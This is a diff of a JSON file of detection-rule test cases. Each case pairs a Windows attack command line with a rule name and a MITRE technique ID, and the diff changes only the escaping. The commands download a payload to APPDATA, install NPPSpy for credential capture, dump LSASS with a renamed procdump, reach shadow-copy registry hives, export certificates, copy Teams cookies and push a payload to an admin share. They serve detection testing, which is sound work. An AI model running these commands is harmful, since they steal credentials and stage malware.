+    "target_commandline": "powershell.exe -COMmANd \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\" $env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -26481,7 +26481,7 @@
   },
   {
     "test_id": "t1059.001_515",
-    "target_commandline": "powershell.exe /\"Command\" \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \" $env:APPDATA\\payload.exe\"\"",
+    "target_commandline": "powershell.exe /\"Command\" \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\" $env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -26489,7 +26489,7 @@
   },
   {
     "test_id": "t1059.001_516",
-    "target_commandline": "powershell.exe -c \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \" $env:APPDATA\\payload.exe\"\"",
+    "target_commandline": "powershell.exe -c \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\" $env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -26497,7 +26497,7 @@
   },
   {
     "test_id": "t1059.001_517",
-    "target_commandline": "powershell.exe -COmmANd \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \" $env:APPDATA\\payload.exe\"\"",
+    "target_commandline": "powershell.exe -COmmANd \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\" $env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -26505,7 +26505,7 @@
   },
   {
     "test_id": "t1059.001_518",
-    "target_commandline": "powershell.exe -COMmAND \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \" $env:APPDATA\\payload.exe\"\"",
+    "target_commandline": "powershell.exe -COMmAND \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\" $env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -26841,7 +26841,7 @@
   },
   {
     "test_id": "t1059.003_092",
-    "target_commandline": "powershell.exe -Command \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \"$env:APPDATA\\payload.exe\"\"",
+    "target_commandline": "powershell.exe -Command \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\"$env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1059.003",
     "shell": "cmd.exe",
@@ -26849,7 +26849,7 @@
   },
   {
     "test_id": "t1059.003_093",
-    "target_commandline": "powershell.exe -ComMAnd \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \" $env:APPDATA\\payload.exe\"\"",
+    "target_commandline": "powershell.exe -ComMAnd \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\" $env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1059.003",
     "shell": "cmd.exe",
@@ -26857,7 +26857,7 @@
   },
   {
     "test_id": "t1059.003_094",
-    "target_commandline": "powershell.exe -COMmANd \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \" $env:APPDATA\\payload.exe\"\"",
+    "target_commandline": "powershell.exe -COMmANd \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\" $env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1059.003",
     "shell": "cmd.exe",
@@ -26865,7 +26865,7 @@
   },
   {
     "test_id": "t1059.003_095",
-    "target_commandline": "powershell.exe /\"Command\" \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \" $env:APPDATA\\payload.exe\"\"",
+    "target_commandline": "powershell.exe /\"Command\" \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\" $env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1059.003",
     "shell": "cmd.exe",
@@ -26873,7 +26873,7 @@
   },
   {
     "test_id": "t1059.003_096",
-    "target_commandline": "powershell.exe -c \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \" $env:APPDATA\\payload.exe\"\"",
+    "target_commandline": "powershell.exe -c \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\" $env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1059.003",
     "shell": "cmd.exe",
@@ -26881,7 +26881,7 @@
   },
   {
     "test_id": "t1059.003_097",
-    "target_commandline": "powershell.exe -COmmANd \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \" $env:APPDATA\\payload.exe\"\"",
+    "target_commandline": "powershell.exe -COmmANd \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\" $env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1059.003",
     "shell": "cmd.exe",
@@ -26889,7 +26889,7 @@
   },
   {
     "test_id": "t1059.003_098",
-    "target_commandline": "powershell.exe -COMmAND \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \" $env:APPDATA\\payload.exe\"\"",
+    "target_commandline": "powershell.exe -COMmAND \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\" $env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1059.003",
     "shell": "cmd.exe",
@@ -27265,7 +27265,7 @@
   },
   {
     "test_id": "t1105_029",
-    "target_commandline": "powershell.exe -Command \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \"$env:APPDATA\\payload.exe\"\"",
+    "target_commandline": "powershell.exe -Command \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\"$env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1105",
     "shell": "cmd.exe",
@@ -27273,7 +27273,7 @@
   },
   {
     "test_id": "t1105_030",
-    "target_commandline": "powershell.exe -ComMAnd \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \" $env:APPDATA\\payload.exe\"\"",
+    "target_commandline": "powershell.exe -ComMAnd \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\" $env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1105",
     "shell": "cmd.exe",
@@ -27281,7 +27281,7 @@
   },
   {
     "test_id": "t1105_031",
-    "target_commandline": "powershell.exe -COMmANd \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \" $env:APPDATA\\payload.exe\"\"",
+    "target_commandline": "powershell.exe -COMmANd \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\" $env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1105",
     "shell": "cmd.exe",
@@ -27289,7 +27289,7 @@
   },
   {
     "test_id": "t1105_032",
-    "target_commandline": "powershell.exe /\"Command\" \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \" $env:APPDATA\\payload.exe\"\"",
+    "target_commandline": "powershell.exe /\"Command\" \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\" $env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1105",
     "shell": "cmd.exe",
@@ -27297,7 +27297,7 @@
   },
   {
     "test_id": "t1105_033",
-    "target_commandline": "powershell.exe -c \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \" $env:APPDATA\\payload.exe\"\"",
+    "target_commandline": "powershell.exe -c \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\" $env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1105",
     "shell": "cmd.exe",
@@ -27305,7 +27305,7 @@
   },
   {
     "test_id": "t1105_034",
-    "target_commandline": "powershell.exe -COmmANd \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \" $env:APPDATA\\payload.exe\"\"",
+    "target_commandline": "powershell.exe -COmmANd \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\" $env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1105",
     "shell": "cmd.exe",
@@ -27313,7 +27313,7 @@
   },
   {
     "test_id": "t1105_035",
-    "target_commandline": "powershell.exe -COMmAND \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \" $env:APPDATA\\payload.exe\"\"",
+    "target_commandline": "powershell.exe -COMmAND \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\" $env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1105",
     "shell": "cmd.exe",
@@ -27897,7 +27897,7 @@
   },
   {
     "test_id": "t1003_024",
-    "target_commandline": "\"powershell.exe\" & {Copy-Item \"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\NPPSPY.dll\" -Destination \"C:\\Windows\\System32\" \n$path = Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\" -Name PROVIDERORDER \n$UpdatedValue = $Path.PROVIDERORDER + \",NPPSpy\" \nSet-ItemProperty -Path $Path.PSPath -Name \"PROVIDERORDER\" -Value $UpdatedValue \n$rv = New-Item -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\" -ErrorAction Ignore \n$rv = New-Item -Path ('HKLM:\\SYSTEM\\CurrentControlSet\\' + 'Services\\NPPSpy\\NetworkProvider') -ErrorAction Ignore \n$rv = New-ItemProperty -Path ('HKLM:\\SYSTEM\\CurrentControlSet\\' + 'Services\\NPPSpy\\NetworkProvider') -Name \"Class\" -Value 2 -ErrorAction Ignore \n$rv = New-ItemProperty -Path ('HKLM:\\SYSTEM\\CurrentControlSet\\' + 'Services\\NPPSpy\\NetworkProvider') -Name \"Name\" -Value NPPSpy -ErrorAction Ignore \n$rv = New-ItemProperty -Path ('HKLM:\\SYSTEM\\CurrentControlSet\\' + 'Services\\NPPSpy\\NetworkProvider') -Name \"ProviderPath\" -PropertyType ExpandString -Value \"%%SystemRoot%%\\System32\\NPPSPY.dll\" -ErrorAction Ignore \necho \"[!] Please, logout and log back in.\"}",
+    "target_commandline": "\"powershell.exe\" & {Copy-Item \\\"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\NPPSPY.dll\\\" -Destination \\\"C:\\Windows\\System32\\\" \n$path = Get-ItemProperty -Path \\\"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\\\" -Name PROVIDERORDER \n$UpdatedValue = $Path.PROVIDERORDER + \\\",NPPSpy\\\" \nSet-ItemProperty -Path $Path.PSPath -Name \\\"PROVIDERORDER\\\" -Value $UpdatedValue \n$rv = New-Item -Path \\\"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\\" -ErrorAction Ignore \n$rv = New-Item -Path ('HKLM:\\SYSTEM\\CurrentControlSet\\' + 'Services\\NPPSpy\\NetworkProvider') -ErrorAction Ignore \n$rv = New-ItemProperty -Path ('HKLM:\\SYSTEM\\CurrentControlSet\\' + 'Services\\NPPSpy\\NetworkProvider') -Name \\\"Class\\\" -Value 2 -ErrorAction Ignore \n$rv = New-ItemProperty -Path ('HKLM:\\SYSTEM\\CurrentControlSet\\' + 'Services\\NPPSpy\\NetworkProvider') -Name \\\"Name\\\" -Value NPPSpy -ErrorAction Ignore \n$rv = New-ItemProperty -Path ('HKLM:\\SYSTEM\\CurrentControlSet\\' + 'Services\\NPPSpy\\NetworkProvider') -Name \\\"ProviderPath\\\" -PropertyType ExpandString -Value \\\"%%SystemRoot%%\\System32\\NPPSPY.dll\\\" -ErrorAction Ignore \necho \\\"[!] Please, logout and log back in.\\\"}",
     "target_rule": "proc_creation_win_registry_new_network_provider",
     "technique_id": "t1003",
     "shell": "cmd.exe",
@@ -27905,7 +27905,7 @@
   },
   {
     "test_id": "t1003_025",
-    "target_commandline": "\"powershell.exe\" & {Copy-Item \"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\NPPSPY.dll\" -Destination \"C:\\Windows\\System32\" \n$path = Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\" -Name PROVIDERORDER \n$UpdatedValue = $Path.PROVIDERORDER + \",NPPSpy\" \nSet-ItemProperty -Path $Path.PSPath -Name \"PROVIDERORDER\" -Value $UpdatedValue \n$rv = New-Item -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\" -ErrorAction Ignore \n$rv = New-Item -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Serv*\\NPPSpy\\NetworkProvider\" -ErrorAction Ignore \n$rv = New-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Serv*\\NPPSpy\\NetworkProvider\" -Name \"Class\" -Value 2 -ErrorAction Ignore \n$rv = New-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Serv*\\NPPSpy\\NetworkProvider\" -Name \"Name\" -Value NPPSpy -ErrorAction Ignore \n$rv = New-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Serv*\\NPPSpy\\NetworkProvider\" -Name \"ProviderPath\" -PropertyType ExpandString -Value \"%%SystemRoot%%\\System32\\NPPSPY.dll\" -ErrorAction Ignore \necho \"[!] Please, logout and log back in.\"}",
+    "target_commandline": "\"powershell.exe\" & {Copy-Item \\\"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\NPPSPY.dll\\\" -Destination \\\"C:\\Windows\\System32\\\" \n$path = Get-ItemProperty -Path \\\"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\\\" -Name PROVIDERORDER \n$UpdatedValue = $Path.PROVIDERORDER + \\\",NPPSpy\\\" \nSet-ItemProperty -Path $Path.PSPath -Name \\\"PROVIDERORDER\\\" -Value $UpdatedValue \n$rv = New-Item -Path \\\"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\\" -ErrorAction Ignore \n$rv = New-Item -Path \\\"HKLM:\\SYSTEM\\CurrentControlSet\\Serv*\\NPPSpy\\NetworkProvider\\\" -ErrorAction Ignore \n$rv = New-ItemProperty -Path \\\"HKLM:\\SYSTEM\\CurrentControlSet\\Serv*\\NPPSpy\\NetworkProvider\\\" -Name \\\"Class\\\" -Value 2 -ErrorAction Ignore \n$rv = New-ItemProperty -Path \\\"HKLM:\\SYSTEM\\CurrentControlSet\\Serv*\\NPPSpy\\NetworkProvider\\\" -Name \\\"Name\\\" -Value NPPSpy -ErrorAction Ignore \n$rv = New-ItemProperty -Path \\\"HKLM:\\SYSTEM\\CurrentControlSet\\Serv*\\NPPSpy\\NetworkProvider\\\" -Name \\\"ProviderPath\\\" -PropertyType ExpandString -Value \\\"%%SystemRoot%%\\System32\\NPPSPY.dll\\\" -ErrorAction Ignore \necho \\\"[!] Please, logout and log back in.\\\"}",
     "target_rule": "proc_creation_win_registry_new_network_provider",
     "technique_id": "t1003",
     "shell": "cmd.exe",
@@ -27985,7 +27985,7 @@
   },
   {
     "test_id": "t1036_022",
-    "target_commandline": "copy procdump.exe \"\\?\\C:\\Program Files\\Microsoft Visual Studio\\dump64.exe\" && \"\\?\\C:\\Program Files\\Microsoft Visual Studio\\dump64.exe\" -AcceptEula -ma lsass.exe lsass.dmp",
+    "target_commandline": "copy procdump.exe \"\\\\?\\C:\\Program Files\\Microsoft Visual Studio\\dump64.exe\" && \"\\\\?\\C:\\Program Files\\Microsoft Visual Studio\\dump64.exe\" -AcceptEula -ma lsass.exe lsass.dmp",
     "target_rule": "proc_creation_win_dump64_defender_av_bypass_rename",
     "technique_id": "t1036",
     "shell": "cmd.exe",
@@ -27993,7 +27993,7 @@
   },
   {
     "test_id": "t1036_023",
-    "target_commandline": "copy procdump.exe \"\\?\\C:\\Program Files\\Microsoft Visual Studio\\dump64.exe\" && \"\\?\\C:\\Program Files\\Microsoft Visual Studio\\dump64.exe\" -aCcEpTeUlA -\"ma\" lsass.exe lsass.dmp",
+    "target_commandline": "copy procdump.exe \"\\\\?\\C:\\Program Files\\Microsoft Visual Studio\\dump64.exe\" && \"\\\\?\\C:\\Program Files\\Microsoft Visual Studio\\dump64.exe\" -aCcEpTeUlA -\"ma\" lsass.exe lsass.dmp",
     "target_rule": "proc_creation_win_dump64_defender_av_bypass_rename",
     "technique_id": "t1036",
     "shell": "cmd.exe",
@@ -28001,7 +28001,7 @@
   },
   {
     "test_id": "t1036_024",
-    "target_commandline": "copy procdump.exe \"\\?\\C:\\Program Files\\Microsoft Visual Studio\\dump64.exe\" && \"\\?\\C:\\Program Files\\Microsoft Visual Studio\\dump64.exe\" -AccEpteula -ma lsass.exe lsass.dmp",
+    "target_commandline": "copy procdump.exe \"\\\\?\\C:\\Program Files\\Microsoft Visual Studio\\dump64.exe\" && \"\\\\?\\C:\\Program Files\\Microsoft Visual Studio\\dump64.exe\" -AccEpteula -ma lsass.exe lsass.dmp",
     "target_rule": "proc_creation_win_dump64_defender_av_bypass_rename",
     "technique_id": "t1036",
     "shell": "cmd.exe",
@@ -28009,7 +28009,7 @@
   },
   {
     "test_id": "t1036_025",
-    "target_commandline": "copy procdump.exe \"\\?\\C:\\Program Files\\Microsoft Visual Studio\\dump64.exe\" && \"\\?\\C:\\Program Files\\Microsoft Visual Studio\\dump64.exe\" -acCEPtEuLA -\"ma\" lsass.exe lsass.dmp",
+    "target_commandline": "copy procdump.exe \"\\\\?\\C:\\Program Files\\Microsoft Visual Studio\\dump64.exe\" && \"\\\\?\\C:\\Program Files\\Microsoft Visual Studio\\dump64.exe\" -acCEPtEuLA -\"ma\" lsass.exe lsass.dmp",
     "target_rule": "proc_creation_win_dump64_defender_av_bypass_rename",
     "technique_id": "t1036",
     "shell": "cmd.exe",
@@ -28017,7 +28017,7 @@
   },
   {
     "test_id": "t1036_026",
-    "target_commandline": "copy procdump.exe \"\\?\\C:\\Program Files\\Microsoft Visual Studio\\dump64.exe\" && \"\\?\\C:\\Program Files\\Microsoft Visual Studio\\dump64.exe\" -AccEpteulA -MA lsass.exe lsass.dmp",
+    "target_commandline": "copy procdump.exe \"\\\\?\\C:\\Program Files\\Microsoft Visual Studio\\dump64.exe\" && \"\\\\?\\C:\\Program Files\\Microsoft Visual Studio\\dump64.exe\" -AccEpteulA -MA lsass.exe lsass.dmp",
     "target_rule": "proc_creation_win_dump64_defender_av_bypass_rename",
     "technique_id": "t1036",
     "shell": "cmd.exe",
@@ -28121,7 +28121,7 @@
   },
   {
     "test_id": "t1003.002_001",
-    "target_commandline": "cmd.exe /c \"m^kli^n^k /D C:\\temp\\vss \\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\"",
+    "target_commandline": "cmd.exe /c \"m^kli^n^k /D C:\\temp\\vss \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\"",
     "target_rule": "proc_creation_win_cmd_mklink_shadow_copies_access_symlink",
     "technique_id": "t1003.002",
     "shell": "cmd.exe",
@@ -28129,7 +28129,7 @@
   },
   {
     "test_id": "t1003.002_002",
-    "target_commandline": "cmd.exe /c \"set part1=HarddiskVolume && set part2=ShadowCopy && call mklink /D C:\\temp\\vss \\?\\GLOBALROOT\\Device\\%part1%%part2%1\"",
+    "target_commandline": "cmd.exe /c \"set part1=HarddiskVolume && set part2=ShadowCopy && call mklink /D C:\\temp\\vss \\\\?\\GLOBALROOT\\Device\\%part1%%part2%1\"",
     "target_rule": "proc_creation_win_cmd_mklink_shadow_copies_access_symlink",
     "technique_id": "t1003.002",
     "shell": "cmd.exe",
@@ -28137,7 +28137,7 @@
   },
   {
     "test_id": "t1003.002_003",
-    "target_commandline": "powershell.exe /\"Command\" \"New-Item -ItemType SymbolicLink -Path C:\\temp\\vss_link -Target \\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\"",
+    "target_commandline": "powershell.exe /\"Command\" \"New-Item -ItemType SymbolicLink -Path C:\\temp\\vss_link -Target \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\"",
     "target_rule": "proc_creation_win_cmd_mklink_shadow_copies_access_symlink",
     "technique_id": "t1003.002",
     "shell": "cmd.exe",
@@ -28145,7 +28145,7 @@
   },
   {
     "test_id": "t1003.002_004",
-    "target_commandline": "powershell.exe -\"Command\" \"New-Item -ItemType SymbolicLink -Path C:\\temp\\vss_link -Target \\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\"",
+    "target_commandline": "powershell.exe -\"Command\" \"New-Item -ItemType SymbolicLink -Path C:\\temp\\vss_link -Target \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\"",
     "target_rule": "proc_creation_win_cmd_mklink_shadow_copies_access_symlink",
     "technique_id": "t1003.002",
     "shell": "cmd.exe",
@@ -28289,7 +28289,7 @@
   },
   {
     "test_id": "t1003.003_001",
-    "target_commandline": "cmd.exe /c \"m^kli^n^k /D C:\\temp\\vss \\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\"",
+    "target_commandline": "cmd.exe /c \"m^kli^n^k /D C:\\temp\\vss \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\"",
     "target_rule": "proc_creation_win_cmd_mklink_shadow_copies_access_symlink",
     "technique_id": "t1003.003",
     "shell": "cmd.exe",
@@ -28297,7 +28297,7 @@
   },
   {
     "test_id": "t1003.003_002",
-    "target_commandline": "cmd.exe /c \"set part1=HarddiskVolume && set part2=ShadowCopy && call mklink /D C:\\temp\\vss \\?\\GLOBALROOT\\Device\\%part1%%part2%1\"",
+    "target_commandline": "cmd.exe /c \"set part1=HarddiskVolume && set part2=ShadowCopy && call mklink /D C:\\temp\\vss \\\\?\\GLOBALROOT\\Device\\%part1%%part2%1\"",
     "target_rule": "proc_creation_win_cmd_mklink_shadow_copies_access_symlink",
     "technique_id": "t1003.003",
     "shell": "cmd.exe",
@@ -28305,7 +28305,7 @@
   },
   {
     "test_id": "t1003.003_003",
-    "target_commandline": "powershell.exe /\"Command\" \"New-Item -ItemType SymbolicLink -Path C:\\temp\\vss_link -Target \\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\"",
+    "target_commandline": "powershell.exe /\"Command\" \"New-Item -ItemType SymbolicLink -Path C:\\temp\\vss_link -Target \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\"",
     "target_rule": "proc_creation_win_cmd_mklink_shadow_copies_access_symlink",
     "technique_id": "t1003.003",
     "shell": "cmd.exe",
@@ -28313,7 +28313,7 @@
   },
   {
     "test_id": "t1003.003_004",
-    "target_commandline": "powershell.exe -\"Command\" \"New-Item -ItemType SymbolicLink -Path C:\\temp\\vss_link -Target \\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\"",
+    "target_commandline": "powershell.exe -\"Command\" \"New-Item -ItemType SymbolicLink -Path C:\\temp\\vss_link -Target \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\"",
     "target_rule": "proc_creation_win_cmd_mklink_shadow_copies_access_symlink",
     "technique_id": "t1003.003",
     "shell": "cmd.exe",
@@ -28505,7 +28505,7 @@
   },
   {
     "test_id": "t1046_188",
-    "target_commandline": "powershell.exe /\"Command\" \"Get-ChildItem -Path Cert:\\CurrentUser\\My | Export-PfxCertificatet-FilePath C:\\temp\\cert.pfx\"",
+    "target_commandline": "powershell.exe /\"Command\" \"Get-ChildItem -Path Cert:\\CurrentUser\\My | Export-PfxCertificatet-FilePath C:\\\\temp\\\\cert.pfx\\\"",
     "target_rule": "proc_creation_win_powershell_export_certificate",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -28513,7 +28513,7 @@
   },
   {
     "test_id": "t1046_189",
-    "target_commandline": "powershell.exe -\"Command\" \"Get-ChildItem -Path Cert:\\CurrentUser\\My | Export-PfxCertificatet-FilePath C:\\temp\\cert.pfx\"",
+    "target_commandline": "powershell.exe -\"Command\" \"Get-ChildItem -Path Cert:\\CurrentUser\\My | Export-PfxCertificatet-FilePath C:\\\\temp\\\\cert.pfx\\\"",
     "target_rule": "proc_creation_win_powershell_export_certificate",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -28641,7 +28641,7 @@
   },
   {
     "test_id": "t1518_023",
-    "target_commandline": "cmd.exe /c \"cd %APPDATA%\\Microsoft\\Teams && copy Cookies\\* C:\\temp\"",
+    "target_commandline": "cmd.exe /c \"cd %APPDATA%\\Microsoft\\Teams && copy Cookies\\* C:\\temp\\\"",
     "target_rule": "proc_creation_win_teams_suspicious_command_line_cred_access",
     "technique_id": "t1518",
     "shell": "cmd.exe",
@@ -28833,7 +28833,7 @@
   },
   {
     "test_id": "t1552.004_011",
-    "target_commandline": "powershell.exe /\"Command\" \"Get-ChildItem -Path Cert:\\CurrentUser\\My | Export-PfxCertificatet-FilePath C:\\temp\\cert.pfx\"",
+    "target_commandline": "powershell.exe /\"Command\" \"Get-ChildItem -Path Cert:\\CurrentUser\\My | Export-PfxCertificatet-FilePath C:\\\\temp\\\\cert.pfx\\\"",
     "target_rule": "proc_creation_win_powershell_export_certificate",
     "technique_id": "t1552.004",
     "shell": "cmd.exe",
@@ -28841,7 +28841,7 @@
   },
   {
     "test_id": "t1552.004_012",
-    "target_commandline": "powershell.exe -\"Command\" \"Get-ChildItem -Path Cert:\\CurrentUser\\My | Export-PfxCertificatet-FilePath C:\\temp\\cert.pfx\"",
+    "target_commandline": "powershell.exe -\"Command\" \"Get-ChildItem -Path Cert:\\CurrentUser\\My | Export-PfxCertificatet-FilePath C:\\\\temp\\\\cert.pfx\\\"",
     "target_rule": "proc_creation_win_powershell_export_certificate",
     "technique_id": "t1552.004",
     "shell": "cmd.exe",
@@ -29049,7 +29049,7 @@
   },
   {
     "test_id": "t1021.002_010",
-    "target_commandline": "cmd.exe /c \"type C:\\temp\\payload.exe > \\\\10.0.0.2\\Admin\\payload.exe\"",
+    "target_commandline": "cmd.exe /c \\\"type C:\\\\temp\\\\payload.exe > \\\\\\\\10.0.0.2\\\\Admin\\payload.exe\"",
     "target_rule": "proc_creation_win_susp_copy_lateral_movement",
     "technique_id": "t1021.002",
     "shell": "cmd.exe",
@@ -29057,7 +29057,7 @@
   },
   {
     "test_id": "t1021.002_011",
-    "target_commandline": "cmd.exe /C \"type C:\\temp\\payload.exe > \\\\10.0.0.2\\Admin\\payload.exe\"",
+    "target_commandline": "cmd.exe /C \\\"type C:\\\\temp\\\\payload.exe > \\\\\\\\10.0.0.2\\\\Admin\\payload.exe\"",
     "target_rule": "proc_creation_win_susp_copy_lateral_movement",
     "technique_id": "t1021.002",
     "shell": "cmd.exe",
@@ -29121,7 +29121,7 @@
   },
   {
     "test_id": "t1039_019",
-    "target_commandline": "cmd.exe /c \"type C:\\temp\\payload.exe > \\\\10.0.0.2\\Admin\\payload.exe\"",
+    "target_commandline": "cmd.exe /c \\\"type C:\\\\temp\\\\payload.exe > \\\\\\\\10.0.0.2\\\\Admin\\payload.exe\"",
     "target_rule": "proc_creation_win_susp_copy_lateral_movement",
     "technique_id": "t1039",
     "shell": "cmd.exe",
@@ -29129,7 +29129,7 @@
   },
   {
     "test_id": "t1039_020",
-    "target_commandline": "cmd.exe /C \"type C:\\temp\\payload.exe > \\\\10.0.0.2\\Admin\\payload.exe\"",
+    "target_commandline": "cmd.exe /C \\\"type C:\\\\temp\\\\payload.exe > \\\\\\\\10.0.0.2\\\\Admin\\payload.exe\"",
     "target_rule": "proc_creation_win_susp_copy_lateral_movement",
     "technique_id": "t1039",
     "shell": "cmd.exe",
@@ -29193,7 +29193,7 @@
   },
   {
     "test_id": "t1039_028",
-    "target_commandline": "cmd.exe /c \"type C:\\temp\\payload.exe > \\\\10.0.0.2\\Admin\\payload.exe\"",
+    "target_commandline": "cmd.exe /c \\\"type C:\\\\temp\\\\payload.exe > \\\\\\\\10.0.0.2\\\\Admin\\payload.exe\"",
     "target_rule": "proc_creation_win_susp_copy_lateral_movement",
     "technique_id": "t1039",
     "shell": "cmd.exe",
@@ -29201,7 +29201,7 @@
   },
   {
     "test_id": "t1039_029",
-    "target_commandline": "cmd.exe /C \"type C:\\temp\\payload.exe > \\\\10.0.0.2\\Admin\\payload.exe\"",
+    "target_commandline": "cmd.exe /C \\\"type C:\\\\temp\\\\payload.exe > \\\\\\\\10.0.0.2\\\\Admin\\payload.exe\"",
     "target_rule": "proc_creation_win_susp_copy_lateral_movement",
     "technique_id": "t1039",
     "shell": "cmd.exe",
@@ -29265,7 +29265,7 @@
   },
   {
     "test_id": "t1490_001",
-    "target_commandline": "\"cmd.exe\" /c c^opy \\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\Windows\\Temp\\VSC_SYSTEM_HIVE",
